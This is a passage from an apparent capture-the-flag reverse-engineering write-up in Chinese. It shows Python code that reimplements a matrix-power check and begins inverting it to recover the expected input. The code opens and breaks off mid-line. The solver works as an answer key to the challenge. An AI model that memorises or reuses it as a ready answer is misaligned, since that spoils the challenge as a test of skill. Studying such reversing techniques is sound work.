class="keyword">in</span> na: b.extend(a.to_bytes(n, byteorder=<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line">cnts = [<span class="number">0xdc37c0e304978087</span>, <span class="number">0x594b7f91f11228e5</span>, </span><br><span class="line">        <span class="number">0x264f1c2a310e43aa</span>, <span class="number">0x06f62577ddb8f7c8</span>, <span class="number">0x2f5eef5c62186c64</span>, <span class="number">0x3b278b1ea0e08e88</span>, </span><br><span class="line">        <span class="number">0x030b6b0678e48aee</span>, <span class="number">0x5857a70651b71bd1</span>, <span class="number">0x11328681bbf8806a</span>, <span class="number">0x46a52df6f08b2685</span>, </span><br><span class="line">        <span class="number">0x5b5746a4910ca7fd</span>, <span class="number">0x04fce2f265662e21</span>, <span class="number">0x32a013dc0e0f538a</span>, <span class="number">0xfffec7ae2c6f8f79</span>, </span><br><span class="line">        <span class="number">0x3b0ad6e24be21f00</span>, <span class="number">0xd285721394b26b6f</span>, <span class="number">0x49ff24112a0c1a2e</span>, <span class="number">0xf3a55fbbc4837e78</span>, </span><br><span class="line"></span><br><span class="line">        <span class="number">0x65de31ef76b34c5e</span>, <span class="number">0xbf9224aa780960ba</span>, <span class="number">0x944c61fe664d8a46</span>, <span class="number">0x85ffaacd31f816d1</span>, </span><br><span class="line">        <span class="number">0x5fe739de69b61b49</span>, <span class="number">0x4362ab9dfd8274e5</span>, <span class="number">0xc90b9e6ac29a84ec</span>, <span class="number">0x661807122a7615d7</span>, </span><br><span class="line">        <span class="number">0x2367a1bf2b936d7c</span>, <span class="number">0x289e160527983def</span>, <span class="number">0xb0e4b274464c4bfd</span>, <span class="number">0x5222046dfef7b826</span>, </span><br><span class="line">        <span class="number">0x6158769ed8530622</span>, <span class="number">0x056eabd584b51a70</span>, <span class="number">0xa5b7c08151fface8</span>, <span class="number">0xc7b8d0a6d71a6e00</span>]</span><br><span class="line"></span><br><span class="line">mode = cnts[<span class="number">0</span>]</span><br><span class="line">power = <span class="number">0x594b7f91f11228e5</span></span><br><span class="line">mcnt = cnts[<span class="number">2</span>:<span class="number">18</span>]</span><br><span class="line">encs = cnts[<span class="number">18</span>:<span class="number">34</span>]</span><br><span class="line">inp = <span class="built_in">bytearray</span>.fromhex(<span class="string">&quot;ffac071f3fabda20d4f3a936840a1f9bf05e3650f645479145b99f6219357939&quot;</span>)</span><br><span class="line">qinp = b2nle(inp, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    mcnt[i] ^= qinp[i%<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">if</span> mcnt[i] &gt; mode: <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>); exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">M = Matrix([mcnt[i:i+<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>)])</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">int</span>(M.det() % mode) == <span class="number">0</span>: <span class="keyword">raise</span> ValueError(<span class="string">&quot;Matrix is singular modulo mode!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_pow_mod</span>(<span class="params">matrix, power, modulus</span>):</span><br><span class="line">    n = matrix.shape[<span class="number">0</span>]</span><br><span class="line">    result = Matrix.eye(n)</span><br><span class="line">    base = matrix.applyfunc(<span class="keyword">lambda</span> x: x % modulus)</span><br><span class="line">    <span class="keyword">while</span> power &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> power &amp; <span class="number">1</span>: result = (result * base).applyfunc(<span class="keyword">lambda</span> x: x % modulus)</span><br><span class="line">        base = (base * base).applyfunc(<span class="keyword">lambda</span> x: x % modulus)</span><br><span class="line">        power &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">R = matrix_pow_mod(M, power, mode)</span><br><span class="line">result = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> R]</span><br><span class="line">t = n2ble(result,<span class="number">16</span>).<span class="built_in">hex</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>): <span class="built_in">print</span>(t[<span class="number">32</span>*i:<span class="number">32</span>*i+<span class="number">32</span>])</span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">    <span class="keyword">assert</span> result == encs</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Not equal&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>接下来实现check的完整逆向函数：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> Matrix</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_func_name_to_dll_map</span>(<span class="params">db_path=<span class="string">&quot;exported_functions.db&quot;</span></span>):</span><br><span class="line">    conn = sqlite3.connect(db_path)</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    cur.execute(<span class="string">&quot;SELECT id, exported_functions FROM dll_exports&quot;</span>)</span><br><span class="line">    mapping = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> dll_id, funcs_text <span class="keyword">in</span> cur.fetchall():</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            funcs = ast.literal_eval(funcs_text)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(funcs, <span class="built_in">list</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> funcs:</span><br><span class="line">            mapping[f] = dll_id</span><br><span class="line">    conn.close()</span><br><span class="line">    <span class="keyword">return</span> mapping</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_func_tagkey</span>(<span class="params">func_name, func_to_dll, matrix_lines, my_id, orders</span>):</span><br><span class="line">    dll_id = func_to_dll.get(func_name)</span><br><span class="line">    <span class="keyword">if</span> dll_id <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> KeyError(<span class="string">f&quot;Function <span class="subst">&#123;func_name&#125;</span> not found in exported_functions.db&quot;</span>)</span><br><span class="line">    my_id_str = <span class="built_in">str</span>(my_id).zfill(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        my_pos = orders.index(my_id_str)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">raise</span> KeyError(<span class="string">f&quot;Current DLL <span class="subst">&#123;my_id_str&#125;</span> not found in orders list&quot;</span>)</span><br><span class="line">    col_idx = <span class="built_in">int</span>(dll_id)</span><br><span class="line">    tagkey = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> weight, prev_id <span class="keyword">in</span> <span class="built_in">enumerate</span>(orders[:my_pos]):</span><br><span class="line">        row_idx = <span class="built_in">int</span>(prev_id)</span><br><span class="line">        bit = matrix_lines[row_idx][col_idx]</span><br><span class="line">        <span class="keyword">if</span> bit == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            tagkey += weight</span><br><span class="line">    <span class="keyword">return</span> tagkey</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_first_dword</span>(<span class="params">data, tagkey</span>):</span><br><span class="line">    val = <span class="built_in">int</span>.from_bytes(data[:<span class="number">4</span>], byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    val ^= (tagkey &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">    data[:<span class="number">4</span>] = val.to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_mul</span>(<span class="params">a, b</span>):</span><br><span class="line">    res = <span class="built_in">bytearray</span>(<span class="number">32</span>)</span><br><span class="line">    carry = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        total = carry</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>):</span><br><span class="line">            total += a[j] * b[i - j]</span><br><span class="line">        res[i] = total &amp; <span class="number">0xFF</span></span><br><span class="line">        carry = total &gt;&gt; <span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_const</span>(<span class="params">buf, offsets, na, n</span>):</span><br><span class="line">    <span class="keyword">for</span> a, offset <span class="keyword">in</span> <span class="built_in">zip</span>(na, offsets):</span><br><span class="line">        buf[offset:offset + n] = a.to_bytes(n, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_A</span>(<span class="params">inp, qkey</span>):</span><br><span class="line">    sbox = n2ble(qkey, <span class="number">8</span>)</span><br><span class="line">    inp = <span class="built_in">bytearray</span>([sbox[byte] <span class="keyword">for</span> byte <span class="keyword">in</span> inp])</span><br><span class="line">    <span class="keyword">return</span> inp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_B</span>(<span class="params">inp, qkey</span>):</span><br><span class="line">    perm = n2ble(qkey, <span class="number">8</span>)</span><br><span class="line">    result = <span class="built_in">bytearray</span>(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        result[i] = inp[perm[i]]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_C</span>(<span class="params">inp, qkey</span>):</span><br><span class="line">    key = load_const(<span class="built_in">bytearray</span>(<span class="number">32</span>), [<span class="number">0</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">23</span>], qkey, <span class="number">8</span>)</span><br><span class="line">    tag = inp[<span class="number">0</span>] &amp; <span class="number">1</span></span><br><span class="line">    inp[<span class="number">0</span>] |= <span class="number">1</span></span><br><span class="line">    v3 = <span class="built_in">bytearray</span>(<span class="number">32</span>)</span><br><span class="line">    v3[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">    v2 = <span class="built_in">bytearray</span>(<span class="number">64</span>)</span><br><span class="line">    v2[<span class="number">32</span>:] = inp</span><br><span class="line">    <span class="keyword">for</span> byte_idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        byte_val = key[byte_idx]</span><br><span class="line">        <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> (byte_val &gt;&gt; bit) &amp; <span class="number">1</span>:</span><br><span class="line">                v3 = poly_mul(v3, v2[<span class="number">32</span>:])</span><br><span class="line">            v2[<span class="number">32</span>:] = poly_mul(v2[<span class="number">32</span>:], v2[<span class="number">32</span>:])</span><br><span class="line">    result = v3</span><br><span class="line">    result[<span class="number">0</span>] ^= tag ^ <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b2nle</span>(<span class="params">b, n</span>):</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>.from_bytes(b[i:i+n], byteorder=<span class="string">&#x27;little&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(b), n)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">n2ble</span>(<span class="params">na, n</span>):</span><br><span class="line">    b = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> na: b.extend(<span class="built_in">int</span>(a).to_bytes(n, byteorder=<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_cnts_c</span>(<span class="params">config_id</span>):</span><br><span class="line">    path = os.path.join(<span class="string">&quot;consts_check&quot;</span>, <span class="string">f&quot;<span class="subst">&#123;config_id&#125;</span>_c.txt&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">        <span class="keyword">raise</span> FileNotFoundError(path)</span><br><span class="line">    txt = <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>).read().strip()</span><br><span class="line">    cnts = ast.literal_eval(txt)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(cnts, <span class="built_in">list</span>) <span class="keyword">or</span> <span class="built_in">len</span>(cnts) != <span class="number">34</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid _c.txt format, expected 34 ints&quot;</span>)</span><br><span class="line">    mode = <span class="built_in">int</span>(cnts[<span class="number">0</span>])</span><br><span class="line">    power = <span class="built_in">int</span>(cnts[<span class="number">1</span>])</span><br><span class="line">    mcnt = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> cnts[<span class="number">2</span>:<span class="number">18</span>]]</span><br><span class="line">    encs = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> cnts[<span class="number">18</span>:<span class="number">34</span>]]</span><br><span class="line">    <span class="keyword">return</span> mode, power, mcnt, encs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_config_txt</span>(<span class="params">config_id</span>):</span><br><span class="line">    path = os.path.join(<span class="string">&quot;consts&quot;</span>, <span class="string">f&quot;<span class="subst">&#123;config_id&#125;</span>.txt&quot;</span>)</span><br><span class="line">    lines = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> f:</span><br><span class="line">            s = l.strip()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> s <span class="keyword">or</span> s.startswith(<span class="string">&quot;#&quot;</span>): <span class="keyword">continue</span></span><br><span class="line">            parts = s.split(<span class="string">&quot;\t&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(parts) &lt; <span class="number">3</span>: <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid config line: &quot;</span> + l)</span><br><span class="line">            func_name = parts[<span class="number">0</span>].strip()</span><br><span class="line">            typ = parts[<span class="number">1</span>].strip()</span><br><span class="line">            qkey = ast.literal_eval(parts[<span class="number">2</span>].strip())</span><br><span class="line">            lines.append((func_name, typ, qkey))</span><br><span class="line">    <span class="keyword">return</span> lines</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_pow_mod_sympy</span>(<span class="params">A, power, modulus</span>):</span><br><span class="line">    n = A.shape[<span class="number">0</span>]</span><br><span class="line">    result = Matrix.eye(n)</span><br><span class="line">    base = A.copy()</span><br><span class="line">    base = base.applyfunc(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x) % modulus)</span><br><span class="line">    <span class="keyword">while</span> power &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> power &amp; <span class="number">1</span>: result = (result * base).applyfunc(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x) % modulus)</span><br><span class="line">        base = (base * base).applyfunc(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x) % modulus)</span><br><span class="line">        power &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result.applyfunc(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x) % modulus)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_for_qs_direct</span>(<span class="params">mode, power, mcnt_file, encs</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mat_from_flat</span>(<span class="params">flat, n=<span class="number">4</span></span>): <span class="keyword">return</span> [flat[i*n:(i+<span class="number">1</span>)*n] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mat_mul</span>(<span class="params">X, Y, mod</span>):</span><br><span class="line">        n, k, m = <span class="built_in">len</span>(X), <span class="built_in">len</span>(Y), <span class="built_in">len</span>(Y[<span class="number">0</span>])</span><br><span class="line">        Z = [[<span class="number">0</span>]*m <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            Xi, Zi = X[i], Z[i]</span><br><span class="line">            <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">                a = Xi[t] % mod</span><br><span class="line">                <span class="keyword">if</span> a == <span class="number">0</span>:  <span class="keyword">continue</span></span><br><span class="line">                Yt = Y[t]</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m): Zi[j] = (Zi[j] + a * (Yt[j] % mod)) % mod</span><br><span class="line">        <span class="keyword">return</span> Z</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">eye</span>(<span class="params">n</span>): <span class="keyword">return</span> [[<span class="number">1</span> <span class="keyword">if</span> i == j <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mat_pow</span>(<span class="params">M, exp, mod</span>):</span><br><span class="line">        n = <span class="built_in">len</span>(M)</span><br><span class="line">        <span class="keyword">assert</span> n == <span class="built_in">len</span>(M[<span class="number">0</span>])</span><br><span class="line">        R = eye(n)</span><br><span class="line">        B = [[x % mod <span class="keyword">for</span> x <span class="keyword">in</span> row] <span class="keyword">for</span> row <span class="keyword">in</span> M]</span><br><span class="line">        e = exp</span><br><span class="line">        <span class="keyword">while</span> e &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> e &amp; <span class="number">1</span>: R = mat_mul(R, B, mod)</span><br><span class="line">            e &gt;&gt;= <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> e: B = mat_mul(B, B, mod)</span><br><span class="line">        <span class="keyword">return</span> R</span><br><span class="line"></span><br><span class="line">    p = mode</span><br><span class="line">    e = power</span><br><span class="line">    p2 = p * p</span><br><span class="line">    p3 = p2 * p</span><br><span class="line">    p4 = p3 * p</span><br><span class="line">    N = (p4 - <span class="number">1</span>) * (p4 - p) * (p4 - p2) * (p4 - p3)</span><br><span class="line">    <span class="keyword">if</span> gcd(e, N) != <span class="number">1</span>: <span class="keyword">raise</span> ValueError(<span class="string">&quot;cannot invert power with |GL(4, p)|&quot;</span>)</span><br><span class="line">    d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, N)</span><br><span class="line">    Enc = mat_from_flat(encs)</span><br><span class="line">    M_recovered = mat_pow(Enc, d, p)</span><br><span class="line">    M_flat = [M_recovered[r][c] <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    q_candidates = [<span class="literal">None</span>] * <span class="number">4</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        col = i % <span class="number">4</span></span><br><span class="line">        q_val = M_flat[i] ^ mcnt_file[i]</span><br><span class="line">        <span class="keyword">if</span> q_candidates[col] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            q_candidates[col] = q_val</span><br><span class="line">        <span class="keyword">elif</span> q_candidates[col] != q_val: <span class="keyword">raise</span> ValueError(<span class="string">f&quot;q<span class="subst">&#123;col&#125;</span> not same: <span class="subst">&#123;q_candidates[col]&#125;</span>, <span class="subst">&#123;q_val&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> q_candidates</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_func_C_bytes</span>(<span class="params">output_bytes, qkey</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">u256_from_bytes_le</span>(<span class="params">b</span>): <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(b, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">u256_to_bytes_le</span>(<span class="params">x</span>): <span class="keyword">return</span> (x &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">256</span>) - <span class="number">1</span>)).to_bytes(<span class="number">32</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">build_key_u256_from_qkey</span>(<span class="params">qkey_u64</span>):</span><br><span class="line">        key = <span class="built_in">bytearray</span>(<span class="number">32</span>)</span><br><span class="line">        offs = [<span class="number">0</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">23</span>]</span><br><span class="line">        <span class="keyword">for</span> v, off <span class="keyword">in</span> <span class="built_in">zip</span>(qkey_u64, offs): key[off:off+<span class="number">8</span>] = <span class="built_in">int</span>(v).to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(key, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pow_mod_2_256</span>(<span class="params">base_u256, exp_u256</span>): <span class="keyword">return</span> <span class="built_in">pow</span>(base_u256, exp_u256, <span class="number">1</span> &lt;&lt; <span class="number">256</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(output_bytes) != <span class="number">32</span>: <span class="keyword">raise</span> ValueError(<span class="string">&quot;output must be 32 bytes&quot;</span>)</span><br><span class="line"></span><br><span class="line">    K = build_key_u256_from_qkey(qkey)</span><br><span class="line">    <span class="keyword">if</span> (K 